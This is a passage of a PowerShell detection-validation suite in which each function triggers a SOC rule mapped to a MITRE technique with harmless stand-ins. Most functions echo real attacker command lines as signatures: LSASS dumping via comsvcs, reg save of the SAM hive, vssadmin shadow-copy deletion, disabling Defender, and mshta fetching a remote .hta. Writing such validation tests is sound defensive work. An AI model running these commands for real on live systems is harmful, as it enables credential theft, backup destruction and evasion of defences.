    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1024' 'Known-adversary TTP cmdline (net user CtxAppVCOMService / sc start AppMgmt)' 'Execution' 'T1059' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1025 :: Process executed via WinRM (parent=wsmprovhost.exe)
# MITRE T1021.006 (Lateral Movement)  |  kind=winrm  |  BENIGN validation
function Test-SOC1025 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $ok=$false
    try { Invoke-Command -ComputerName localhost -ScriptBlock { whoami } -ErrorAction Stop | Out-Null; $ok=$true } catch {}
    $status = if($ok){'RAN'}else{'SKIP'}; $detail = if($ok){'wsmprovhost.exe -> whoami via WinRM'}else{'WinRM not enabled (Enable-PSRemoting) '}
    $detail = $detail + ' | note: ' + 'Uses Invoke-Command -ComputerName localhost {whoami} so wsmprovhost.exe is the parent. Requires WinRM enabled.'
    return (New-AtrResult 'SOC1025' 'Process executed via WinRM (parent=wsmprovhost.exe)' 'Lateral Movement' 'T1021.006' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1026 :: PsExec local binary creation over ADMIN$ (initiator=ntoskrnl SMB)
# MITRE T1570 (Lateral Movement)  |  kind=manual  |  BENIGN validation
function Test-SOC1026 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: File create must be initiated by ntoskrnl.exe over SMB to ADMIN$ - only a real remote PsExec produces this.'
    $scaf = 'Run PsExec.exe \\sensorVM from an authorised test host.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1026' 'PsExec local binary creation over ADMIN$ (initiator=ntoskrnl SMB)' 'Lateral Movement' 'T1570' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1027 :: PsExec local binary execution (FileName=psexec.exe)
# MITRE T1570 (Lateral Movement)  |  kind=renproc  |  BENIGN validation
function Test-SOC1027 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'psexec.exe'
    $args = Expand-AtrTokens ''
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to psexec.exe'
    return (New-AtrResult 'SOC1027' 'PsExec local binary execution (FileName=psexec.exe)' 'Lateral Movement' 'T1570' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1028 :: PsExec privilege escalation (psexec.exe -s -i)
# MITRE T1134 (Privilege Escalation)  |  kind=renproc  |  BENIGN validation
function Test-SOC1028 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'psexec.exe'
    $args = Expand-AtrTokens '-s -i'
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to psexec.exe'
    return (New-AtrResult 'SOC1028' 'PsExec privilege escalation (psexec.exe -s -i)' 'Privilege Escalation' 'T1134' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1029 :: PsExec service binary spawning child (psexesvc.exe -> whoami)
# MITRE T1570 (Lateral Movement)  |  kind=renchain  |  BENIGN validation
function Test-SOC1029 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'cmd.exe' -NewName 'psexesvc.exe'
    $args = Expand-AtrTokens '/c whoami'
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'psexesvc.exe (renamed cmd.exe) spawned child'
    return (New-AtrResult 'SOC1029' 'PsExec service binary spawning child (psexesvc.exe -> whoami)' 'Lateral Movement' 'T1570' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1030 :: Gootloader C2 (cscript initiating external connection)
# MITRE T1071 (Command and Control)  |  kind=net  |  BENIGN validation
function Test-SOC1030 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $IncludeNetwork) { return (New-AtrResult 'SOC1030' 'Gootloader C2 (cscript initiating external connection)' 'Command and Control' 'T1071' 'SKIP' ('network test - rerun with -IncludeNetwork -CanaryUrl (hint: )') $marker) }
    if (-not $CanaryUrl) { return (New-AtrResult 'SOC1030' 'Gootloader C2 (cscript initiating external connection)' 'Command and Control' 'T1071' 'SKIP' 'no -CanaryUrl supplied' $marker) }
    $js = Join-Path $wd ('net_'+$rid+'.js')
    Set-Content $js ('var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","'+$CanaryUrl+'",false);try{x.send();}catch(e){}') -Encoding ASCII -Force
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cscript.exe" -Arguments ('//nologo "'+$js+'"') -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = ('cscript -> ' + $CanaryUrl)
    $detail = $detail + ' | note: ' + 'Requires -IncludeNetwork + canary; a benign .js run via cscript makes one request to your canary.'
    return (New-AtrResult 'SOC1030' 'Gootloader C2 (cscript initiating external connection)' 'Command and Control' 'T1071' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1031 :: AnyDesk unattended access (--set-password)
# MITRE T1219 (Command and Control)  |  kind=renproc  |  BENIGN validation
function Test-SOC1031 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'anydesk.exe'
    $args = Expand-AtrTokens '--set-password ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to anydesk.exe'
    return (New-AtrResult 'SOC1031' 'AnyDesk unattended access (--set-password)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1032 :: Atera RMM child process (parent version-info AgentPackageRunCommandInteractive)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1032 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires the real AteraAgent RMM binary as parent (matched on PE version-info).'
    $scaf = 'Install AteraAgent on a test VM and run a benign command through the Atera console.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1032' 'Atera RMM child process (parent version-info AgentPackageRunCommandInteractive)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1034 :: DWService RMM child process (parent=dwagent/python version-info)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1034 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires the real DWAgent binary as parent.'
    $scaf = 'Install DWAgent on a test VM and issue a benign command via the DWService portal.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1034' 'DWService RMM child process (parent=dwagent/python version-info)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1035 :: MeshAgent RMM child process (parent=MeshAgent + -b64exec)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1035 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires the real MeshAgent binary as parent with -b64exec.'
    $scaf = 'Install MeshAgent on a test VM and run a benign command from MeshCentral.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1035' 'MeshAgent RMM child process (parent=MeshAgent + -b64exec)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1036 :: Narrator/accessibility abuse cmdline signature
# MITRE T1546.008 (Privilege Escalation)  |  kind=echo  |  BENIGN validation
function Test-SOC1036 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility" ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1036' 'Narrator/accessibility abuse cmdline signature' 'Privilege Escalation' 'T1546.008' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1037 :: ScreenConnect RMM child process (parent=ScreenConnect.ClientService)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1037 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires the real ScreenConnect client service as parent.'
    $scaf = 'Install ScreenConnect on a test VM and run a benign command from the host session.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1037' 'ScreenConnect RMM child process (parent=ScreenConnect.ClientService)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1038 :: WSUS RCE (parent=wsusservice.exe / w3wp.exe)
# MITRE T1210 (Execution)  |  kind=manual  |  BENIGN validation
function Test-SOC1038 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires wsusservice.exe or w3wp.exe as parent of cmd.exe.'
    $scaf = 'On a WSUS test server, trigger a benign cmd via the WSUS service context.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1038' 'WSUS RCE (parent=wsusservice.exe / w3wp.exe)' 'Execution' 'T1210' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1039 :: Shadow copy deletion cmdline signature
# MITRE T1490 (Impact)  |  kind=echo  |  BENIGN validation
function Test-SOC1039 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'vssadmin delete shadows /for=C: /quiet ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1039' 'Shadow copy deletion cmdline signature' 'Impact' 'T1490' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1040 :: Volume shadow copy creation cmdline signature
# MITRE T1490 (Impact)  |  kind=echo  |  BENIGN validation
function Test-SOC1040 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'wmic shadowcopy create Volume=C: ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1040' 'Volume shadow copy creation cmdline signature' 'Impact' 'T1490' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1042 :: DC / domain-trust discovery via nltest (read-only)
# MITRE T1482 (Discovery)  |  kind=proc  |  BENIGN validation
function Test-SOC1042 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'nltest /domain_trusts /all_trusts'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1042' 'DC / domain-trust discovery via nltest (read-only)' 'Discovery' 'T1482' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1043 :: Sensitive hive save cmdline (reg save HKLM\SAM)
# MITRE T1003.002 (Credential Access)  |  kind=echo  |  BENIGN validation
function Test-SOC1043 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'reg save HKLM\SAM %WD%\sam_%RID%.hive ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1043' 'Sensitive hive save cmdline (reg save HKLM\SAM)' 'Credential Access' 'T1003.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1044 :: FileFix (explorer -> powershell with http/encoded param)
# MITRE T1204 (Execution)  |  kind=procchain  |  BENIGN validation
function Test-SOC1044 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $childExe = "$env:SystemRoot\System32\powershell.exe"
    $childArgs = Expand-AtrTokens '-NoProfile -Command "$u=\"http://example.com/ATRVAL_%RID%\"; $null=$u"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\explorer.exe" -Arguments ('"'+$childExe+'" '+$childArgs) -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=explorer -> child'
    $detail = $detail + ' | note: ' + 'explorer-as-parent is best-effort.'
    if ($status -eq 'RAN') { $status='PARTIAL' }
    return (New-AtrResult 'SOC1044' 'FileFix (explorer -> powershell with http/encoded param)' 'Execution' 'T1204' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1047 :: ClickFix RunMRU value (Run-dialog paste artefact)
# MITRE T1204.002 (Execution)  |  kind=reg  |  BENIGN validation
function Test-SOC1047 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'; $n=Expand-AtrTokens 'ATRVAL_%RID%'; $v='powershell -w hidden -eC ATRVALBENIGN==\1'
    $v = Expand-AtrTokens 'powershell -w hidden -eC ATRVALBENIGN==\1'
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'String'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    $detail = $detail + ' | note: ' + 'Rule filters InitiatingProcessFileName=explorer.exe. Written here via script, so the initiator will be powershell/reg, not explorer - key/data path is exercised but ancestry will not match. True FP-fidelity needs a real Run-dialog paste.'
    if ($status -eq 'RAN') { $status='PARTIAL' }
    return (New-AtrResult 'SOC1047' 'ClickFix RunMRU value (Run-dialog paste artefact)' 'Execution' 'T1204.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1048 :: Defender disabled via PowerShell (Set-MpPreference cmdline)
# MITRE T1562.001 (Defense Evasion)  |  kind=procchain  |  BENIGN validation
function Test-SOC1048 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $childExe = "$env:SystemRoot\System32\cmd.exe"
    $childArgs = Expand-AtrTokens '/c echo Set-MpPreference -DisableRealtimeMonitoring $true ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Arguments ("-NoProfile -Command Start-Process -WindowStyle Hidden -FilePath '"+$childExe+"' -ArgumentList '"+$childArgs+"'") -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=powershell -> child'
    return (New-AtrResult 'SOC1048' 'Defender disabled via PowerShell (Set-MpPreference cmdline)' 'Defense Evasion' 'T1562.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1050 :: MSHTA suspicious network cmdline (mshta + ://)
# MITRE T1218.005 (Defense Evasion)  |  kind=echo  |  BENIGN validation
function Test-SOC1050 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'mshta https://example.com/ATRVAL_%RID%.hta'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1050' 'MSHTA suspicious network cmdline (mshta + ://)' 'Defense Evasion' 'T1218.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1051 :: LSASS dumping cmdline signature (comsvcs/procdump strings)
# MITRE T1003.001 (Credential Access)  |  kind=echo  |  BENIGN validation
function Test-SOC1051 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'rundll32.exe comsvcs.dll, MiniDump 4 %WD%\ATRVAL_%RID%.dmp full :: procdump -ma lsass'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1051' 'LSASS dumping cmdline signature (comsvcs/procdump strings)' 'Credential Access' 'T1003.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1052 :: CabinetRAT hourly task under \Microsoft Office\ (schtasks cmdline)
# MITRE T1053.005 (Persistence)  |  kind=schtask  |  BENIGN validation
function Test-SOC1052 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $tn = Expand-AtrTokens 'ATR_ATRVAL_%RID%'
    $ta = Expand-AtrTokens 'schtasks /create /sc hourly /tn "\Microsoft Office\ATRVAL_%RID%" /tr "cmd /c echo LIMITED" /rl LIMITED'
    $create = '/create /f /tn "'+$tn+'" /sc once /st 23:59 /tr "'+$ta+'"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments $create -Hidden -TimeoutSec 15
    Start-Sleep -Milliseconds 400
    $null = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\schtasks.exe" -Arguments ('/delete /f /tn "'+$tn+'"') -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail='scheduled task '+$tn+' created+deleted'
    return (New-AtrResult 'SOC1052' 'CabinetRAT hourly task under \Microsoft Office\ (schtasks cmdline)' 'Persistence' 'T1053.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1054 :: Discovery commands after RDP (discovery leg only)
# MITRE T1016 (Discovery)  |  kind=proc  |  BENIGN validation
function Test-SOC1054 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'whoami'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $c = Expand-AtrTokens 'ipconfig /all'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $c = Expand-AtrTokens 'net user'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $c = Expand-AtrTokens 'systeminfo'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Runs the discovery commands; the rule also requires a preceding rdpclip.exe/tstheme.exe RDP-session join which won''t be present unless run inside an RDP session.'
    if ($status -eq 'RAN') { $status='PARTIAL' }
    return (New-AtrResult 'SOC1054' 'Discovery commands after RDP (discovery leg only)' 'Discovery' 'T1016' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1055 :: Duo MFA fail-open cmdline (echo api- duosecurity.com 127.0.0.1)
# MITRE T1556 (Defense Evasion)  |  kind=echo  |  BENIGN validation
function Test-SOC1055 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'echo 127.0.0.1 api-ATRVAL%RID%.duosecurity.com'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1055' 'Duo MFA fail-open cmdline (echo api- duosecurity.com 127.0.0.1)' 'Defense Evasion' 'T1556' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1056 :: SimpleHelp RMM child process (parent=SimpleService/SimpleHelp)
# MITRE T1219 (Command and Control)  |  kind=manual  |  BENIGN validation
function Test-SOC1056 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail = 'NOT auto-run: Requires the real SimpleHelp client service as parent.'
    $scaf = 'Install SimpleHelp on a test VM and run whoami/ipconfig via the remote session.'
    $status='MANUAL'; $detail = $detail + ' | scaffold: ' + $scaf
    return (New-AtrResult 'SOC1056' 'SimpleHelp RMM child process (parent=SimpleService/SimpleHelp)' 'Command and Control' 'T1219' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1059 :: Grouped common eCrime tool filenames written by one process
# MITRE T1105 (Execution)  |  kind=file  |  BENIGN validation
function Test-SOC1059 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $made=@()
    $fp = Expand-AtrTokens '%WD%\mimikatz.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $fp = Expand-AtrTokens '%WD%\rclone.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $fp = Expand-AtrTokens '%WD%\netscan.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $fp = Expand-AtrTokens '%WD%\psexec.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $fp = Expand-AtrTokens '%WD%\advanced_port_scanner.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $fp = Expand-AtrTokens '%WD%\anydesk.exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $status = if($made.Count){'RAN'}else{'ERROR'}; $detail = ($made -join '; ')
    Start-Sleep -Milliseconds 400
    foreach($m in $made){ Remove-Item $m -Force -ErrorAction SilentlyContinue }
    return (New-AtrResult 'SOC1059' 'Grouped common eCrime tool filenames written by one process' 'Execution' 'T1105' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1060 :: Double-extension executable (invoice.pdf .exe)
# MITRE T1036.007 (Defense Evasion)  |  kind=file  |  BENIGN validation
function Test-SOC1060 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $made=@()
    $fp = Expand-AtrTokens '%WD%\invoice_%RID%.pdf .exe'
    try { $null=New-Item -ItemType Directory -Path (Split-Path $fp) -Force -ErrorAction SilentlyContinue; Set-Content -Path $fp -Value $marker -Force -ErrorAction Stop; $made+=$fp } catch {}
    $status = if($made.Count){'RAN'}else{'ERROR'}; $detail = ($made -join '; ')
    Start-Sleep -Milliseconds 400
    foreach($m in $made){ Remove-Item $m -Force -ErrorAction SilentlyContinue }
    return (New-AtrResult 'SOC1060' 'Double-extension executable (invoice.pdf .exe)' 'Defense Evasion' 'T1036.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1061 :: Hidden local account (Winlogon SpecialAccounts UserList = 0)
# MITRE T1564.002 (Persistence)  |  kind=reg  |  BENIGN validation
function Test-SOC1061 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
